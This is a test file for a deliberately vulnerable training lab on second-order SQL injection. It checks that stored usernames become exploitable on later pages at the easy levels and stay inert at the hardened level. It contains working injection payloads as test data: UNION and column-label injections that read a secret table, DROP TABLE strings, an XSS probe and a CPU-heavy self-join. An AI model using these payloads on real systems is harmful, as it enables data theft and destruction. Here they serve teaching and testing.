// src/districts/forum-of-pilgrims/fp-10-second-order-sqli/fp-10.spec.ts
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import {
  DB_ERROR_RE, FLAG_RE, describeExploitMatrix, describeLabView, freshSession, type Agent,
} from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { describeCurlExample } from '../../_shared/curl.testkit.js';
import { FP10 } from './challenge.js'; // registers FP-10 before createApp() inside freshSession
import { ACTIVITY_CAP, MEMBER_CAP, canaryFor, dbBuilt, forceName, tableSizes } from './model.js';
import * as divine from './levels/divine.js';
import { challengeDb } from '../../../core/challenge-db.js';

const LAB = '/d/forum-of-pilgrims/second-order-sqli';
type Script = (agent: Agent, level: Level) => Promise<request.Response>;
const LEVELS_HERE: readonly Level[] = ['acolyte', 'inquisitor', 'divine']; // the catalog row is A I D

const register = (a: Agent, l: Level, username: string) => a.post(`${LAB}?level=${l}`).type('form').send({ username });
const activity = (a: Agent, l: Level) => a.get(`${LAB}/activity?level=${l}`);
const report = (a: Agent, l: Level) => a.get(`${LAB}/report?level=${l}`);
const viaActivity = (name: string): Script => async (a, l) => { await register(a, l, name); return activity(a, l); };
const viaReport = (name: string): Script => async (a, l) => { await register(a, l, name); return report(a, l); };

// Acolyte: registration is parameterized (the INSERT is safe), but the later activity query concatenates the stored name.
const ACOLYTE_NAME = "x' UNION SELECT secret, 1 FROM vault-- -";
const acolyteExploit = viaActivity(ACOLYTE_NAME);
// Inquisitor: the activity query is parameterized now; the report page builds a column label from the stored name, and an
// identifier cannot be a bound parameter.
const INQUISITOR_NAME = 'n", (SELECT secret FROM vault) AS "s';
const inquisitorExploit = viaReport(INQUISITOR_NAME);

describeExploitMatrix<Script>({
  challenge: FP10,
  path: LAB,
  send: (agent, level, script) => script(agent, level),
  exploits: { acolyte: acolyteExploit, inquisitor: inquisitorExploit },
  resisted: /You have not registered yet\./, // Divine refuses the hostile name at registration
  legit: [
    { name: 'register, then open your activity', input: viaActivity('river_pilgrim'), expect: 'Activity of river_pilgrim' },
    { name: 'register, then open your report', input: viaReport('river_pilgrim'), expect: 'Report for river_pilgrim' },
  ],
  malformed: [
    { name: 'a lone quote in the stored name (activity)', input: viaActivity("x'"), levels: ['acolyte'] },
    { name: 'a lone double quote in the stored name (report)', input: viaReport('x"'), levels: ['inquisitor'] },
  ],
  privileged: null, // nobody signs in with a privileged account: the lab has no such identity to replay
});

describeLabView({
  challenge: FP10, path: LAB, account: /Choose any username/, echoField: 'username',
  oddBodies: [{ username: { a: 1 } }, { username: ['x'] }, [1, 2], {}],
  level: 'acolyte',
  ok: (a, l) => register(a, l, 'river_pilgrim'),
  bad: (a, l) => register(a, l, ''),
});
describeCurlExample({ challenge: FP10, path: LAB, curl: () => ({ path: '', form: ['username=river_pilgrim'] }) });

/** The rows of a lab page's result table, as text. */
const rowsOf = (html: string): string[] => [...html.matchAll(/<tr data-row>([\s\S]*?)<\/tr>/g)].map((m) => m[1].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());

describe('FP-10 the first use is safe, the second is not', () => {
  it('registration is parameterized at every level: SQL in a name is stored as a name, never an error', async () => {
    for (const level of ['acolyte', 'inquisitor'] as const) {
      const { agent } = await freshSession();
      for (const name of ["a'); DROP TABLE members;--", "x' OR '1'='1", 'q" OR "1"="1']) {
        const res = await register(agent, level, name);
        expect(res.status, `${level} ${name}`).toBe(200);
        expect(res.text, `${level} ${name}`).not.toMatch(DB_ERROR_RE);
        expect(res.text, `${level} ${name}`).toContain('Registered as');
        expect(res.text, `${level} ${name}`).not.toMatch(FLAG_RE);
      }
    }
  });

  it('acolyte: the UNION fires on the SECOND use and returns the vault canary, which earns the flag', async () => {
    const { agent, sid } = await freshSession();
    const reg = await register(agent, 'acolyte', ACOLYTE_NAME);
    expect(reg.text).not.toMatch(FLAG_RE); // nothing fires at registration
    const res = await activity(agent, 'acolyte');
    expect(rowsOf(res.text).join('\n')).toContain(canaryFor(sid, 'acolyte'));
    expect(res.text).toMatch(FLAG_RE);
  });

  it('inquisitor: the activity page is parameterized (the Acolyte payload is just a name); the report page is where it fires', async () => {
    const { agent, sid } = await freshSession();
    await register(agent, 'inquisitor', ACOLYTE_NAME);
    const a = await activity(agent, 'inquisitor');
    expect(a.text).not.toContain(canaryFor(sid, 'inquisitor'));
    expect(a.text).not.toMatch(FLAG_RE);
    expect(a.text).toContain('Activity of x&#39; UNION SELECT secret, 1 FROM vault-- -');
    const other = await freshSession();
    await register(other.agent, 'inquisitor', INQUISITOR_NAME);
    const r = await report(other.agent, 'inquisitor');
    expect(r.text).toContain(canaryFor(other.sid, 'inquisitor'));
    expect(r.text).toMatch(FLAG_RE);
  });

  it('acolyte: the report page uses a fixed label, so the Inquisitor name is only a name there', async () => {
    const { agent, sid } = await freshSession();
    await register(agent, 'acolyte', INQUISITOR_NAME);
    const r = await report(agent, 'acolyte');
    expect(r.text).not.toContain(canaryFor(sid, 'acolyte'));
    expect(r.text).not.toMatch(FLAG_RE);
  });

  it('the canary is per player and per level: one level\'s vault value reads nothing at another', async () => {
    const a = await freshSession();
    const b = await freshSession();
    expect(canaryFor(a.sid, 'acolyte')).toMatch(/^[0-9a-f]{32}$/);
    expect(canaryFor(a.sid, 'acolyte')).not.toBe(canaryFor(b.sid, 'acolyte'));
    expect(canaryFor(a.sid, 'acolyte')).not.toBe(canaryFor(a.sid, 'inquisitor'));
    await register(a.agent, 'acolyte', ACOLYTE_NAME);
    const stolen = rowsOf((await activity(a.agent, 'acolyte')).text).join(' ').match(/[0-9a-f]{32}/)?.[0];
    expect(stolen).toBe(canaryFor(a.sid, 'acolyte'));
    await register(a.agent, 'inquisitor', ACOLYTE_NAME);
    expect((await activity(a.agent, 'inquisitor')).text).not.toContain(stolen);
  });
});

describe('FP-10 divine', () => {
  it('validates the name at registration (3-24 letters, digits, underscore) and says so', async () => {
    const { agent } = await freshSession();
    for (const name of [ACOLYTE_NAME, INQUISITOR_NAME, 'ab', 'x'.repeat(25), 'with space', "o'brien", 'a-b']) {
      const res = await register(agent, 'divine', name);
      expect(res.text, name).toContain('Usernames are 3-24 letters, digits or underscores.');
      expect(res.text, name).toMatch(/class="lab-message lab-error"/);
    }
    expect((await register(agent, 'divine', 'river_pilgrim')).text).toContain('Registered as river_pilgrim.');
  });

  it('even a hostile name that got past validation is only data: both queries stay parameterized and the label is fixed', async () => {
    for (const hostile of [ACOLYTE_NAME, INQUISITOR_NAME, "x'", 'x"', '"; DROP TABLE vault; --']) {
      const { agent, sid } = await freshSession();
      forceName(sid, 'divine', hostile); // the seam skips registration's validation on purpose
      for (const res of [await activity(agent, 'divine'), await report(agent, 'divine')]) {
        expect(res.status, hostile).toBe(200);
        expect(res.text, hostile).not.toContain(canaryFor(sid, 'divine'));
        expect(res.text, hostile).not.toMatch(FLAG_RE);
        expect(res.text, hostile).not.toMatch(DB_ERROR_RE);
      }
    }
  });

  it('below divine a broken query shows the real database message (error-based learning), at divine never', async () => {
    const bad = await freshSession();
    forceName(bad.sid, 'acolyte', "x'");
    expect((await activity(bad.agent, 'acolyte')).text).toMatch(/Database error: /);
    const ok = await freshSession();
    forceName(ok.sid, 'divine', "x'");
    expect((await activity(ok.agent, 'divine')).text).not.toMatch(DB_ERROR_RE);
  });
});

describe('FP-10 specifics', () => {
  it('activity and report without a name are a polite refusal at every level, never a 500 or a flag', async () => {
    for (const level of LEVELS_HERE) {
      const { agent } = await freshSession();
      for (const res of [await activity(agent, level), await report(agent, level)]) {
        expect(res.status, level).toBe(200);
        expect(res.text, level).toContain('You have not registered yet.');
        expect(res.text, level).not.toMatch(FLAG_RE);
      }
    }
  });

  it('a taken or too long name is refused at every level (the seeded members are taken)', async () => {
    for (const level of LEVELS_HERE) {
      const { agent } = await freshSession();
      for (const name of ['pilgrim', 'citadel_admin', 'archivist']) {
        expect((await register(agent, level, name)).text, `${level} ${name}`).toContain('That name is taken.');
      }
      expect((await register(agent, level, 'river_pilgrim')).text, level).toContain('Registered as river_pilgrim.');
      expect((await register(agent, level, 'river_pilgrim')).text, level).toContain('That name is taken.');
      const long = await register(agent, level, 'n'.repeat(65));
      expect(long.text, level).toMatch(/class="lab-message lab-error"/);
      expect(long.text, level).not.toMatch(FLAG_RE);
    }
  });

  it('registering is per player and per level', async () => {
    const a = await freshSession();
    await register(a.agent, 'acolyte', 'river_pilgrim');
    expect((await activity(a.agent, 'acolyte')).text).toContain('Activity of river_pilgrim');
    expect((await activity(a.agent, 'inquisitor')).text).toContain('You have not registered yet.');
    const b = await freshSession();
    expect((await activity(b.agent, 'acolyte')).text).toContain('You have not registered yet.');
    expect((await register(b.agent, 'acolyte', 'river_pilgrim')).text).toContain('Registered as river_pilgrim.'); // another player's database
  });

  it('a result is capped: at most 20 rows are shown however many the query returns', async () => {
    const { agent } = await freshSession();
    for (let i = 0; i < 30; i++) await register(agent, 'acolyte', `member_${i}`);
    await register(agent, 'acolyte', "x' UNION ALL SELECT action, at FROM activity-- -");
    const res = await activity(agent, 'acolyte');
    expect(rowsOf(res.text)).toHaveLength(20);
    expect(res.text).toContain('first 20 rows');
  });

  it('a report shows at most 8 columns of a row', async () => {
    const { agent } = await freshSession();
    await register(agent, 'inquisitor', 'n",1 a,2 b,3 c,4 d,5 e,6 f,7 g,8 h,9 "i');
    const res = await report(agent, 'inquisitor');
    expect(res.status).toBe(200);
    expect(rowsOf(res.text)[0].split(' ').length).toBe(8);
  });

  it('what the database returns is escaped on the page', async () => {
    const { agent } = await freshSession();
    await register(agent, 'acolyte', "x' UNION SELECT '<img src=x onerror=alert(1)>', 1-- -");
    const res = await activity(agent, 'acolyte');
    expect(res.text).toContain('&lt;img src=x onerror=alert(1)&gt;');
    expect(res.text).not.toContain('<img src=x');
  });

  it('members and activity are trimmed so a flood of registrations cannot grow the database without bound', async () => {
    const { agent } = await freshSession();
    for (let i = 0; i < 130; i++) await register(agent, 'acolyte', `flood_${i}`);
    await register(agent, 'acolyte', "x' UNION ALL SELECT action, at FROM activity-- -");
    const res = await activity(agent, 'acolyte');
    expect(res.status).toBe(200);
    // the first names fell out of the bounded table, so they are free again; the seeded members never do
    expect((await register(agent, 'acolyte', 'flood_0')).text).toContain('Registered as flood_0.');
    expect((await register(agent, 'acolyte', 'pilgrim')).text).toContain('That name is taken.');
  });
});

describe('FP-10 bounded state (the cross-join CPU gap)', () => {
  it('registrations are trimmed to small caps, so a self-join of the tables stays small', async () => {
    expect(MEMBER_CAP).toBeLessThanOrEqual(30);
    expect(ACTIVITY_CAP).toBeLessThanOrEqual(30);
    const { agent, sid } = await freshSession();
    for (let i = 0; i < 120; i++) await register(agent, 'acolyte', `flood_${i}`);
    const sizes = tableSizes(sid, 'acolyte');
    expect(sizes.members).toBeLessThanOrEqual(3 + MEMBER_CAP); // the 3 seeded members are never trimmed
    expect(sizes.activity).toBeLessThanOrEqual(6 + ACTIVITY_CAP);
  });

  it('the worst name that fits (a 4-way self-join of activity) answers promptly at the caps', async () => {
    const { agent } = await freshSession();
    for (let i = 0; i < 120; i++) await register(agent, 'acolyte', `flood_${i}`);
    const name = "x'UNION SELECT 1,2 FROM activity,activity,activity,activity--";
    expect(name.length).toBeLessThanOrEqual(64);
    await register(agent, 'acolyte', name);
    const t = performance.now();
    const res = await activity(agent, 'acolyte');
    expect(res.status).toBe(200);
    expect(performance.now() - t).toBeLessThan(3000); // 12.7 s at the old caps (100 activity rows); well under a second now
  });

  it('the database is built on first use: a page that only shows the form never builds it', async () => {
    const { agent, sid } = await freshSession();
    await agent.get(`${LAB}?level=divine`);
    expect(dbBuilt(sid, 'divine')).toBe(false);
    await agent.get(`${LAB}/activity?level=divine`); // not registered: still nothing to read
    expect(dbBuilt(sid, 'divine')).toBe(false);
    await register(agent, 'divine', 'river_pilgrim');
    expect(dbBuilt(sid, 'divine')).toBe(true);
    expect(tableSizes(sid, 'divine').members).toBe(4);
  });
});

describe('divine.register (the INSERT is parameterized at every level)', () => {
  const fresh = () => challengeDb('CREATE TABLE members (id INTEGER PRIMARY KEY, username TEXT UNIQUE NOT NULL); CREATE TABLE activity (id INTEGER PRIMARY KEY, member TEXT NOT NULL, action TEXT NOT NULL, at INTEGER NOT NULL)');
  it('stores a quote-laden name verbatim, and refuses a duplicate', () => {
    const db = fresh();
    const id = divine.register(db, "o'brien'); DROP TABLE members;--", 5);
    expect(id).toBeTypeOf('number');
    expect(db.prepare('SELECT username FROM members').all()).toEqual([{ username: "o'brien'); DROP TABLE members;--" }]);
    expect(db.prepare('SELECT member, action, at FROM activity').all()).toEqual([{ member: "o'brien'); DROP TABLE members;--", action: 'registered', at: 5 }]);
    expect(divine.register(db, "o'brien'); DROP TABLE members;--", 6)).toBeUndefined();
    expect(db.prepare('SELECT COUNT(*) AS n FROM activity').get()).toEqual({ n: 1 });
  });
});
